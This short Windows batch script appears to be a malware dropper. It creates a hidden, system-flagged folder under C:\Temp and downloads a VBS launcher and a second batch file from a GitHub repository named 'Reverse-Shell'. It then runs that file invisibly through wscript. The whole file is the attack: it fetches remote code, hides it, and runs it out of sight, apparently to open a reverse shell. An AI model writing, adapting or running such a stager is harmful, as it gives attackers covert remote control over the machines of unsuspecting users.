@echo off
c:
cd C:\
mkdir Temp
cd Temp
mkdir kaas
attrib +s +h kaas
cd kaas
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/invisible.vbs -Outfile invisible.vbs"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/run2.bat -Outfile run2.bat"
wscript.exe invisible.vbs run2.bat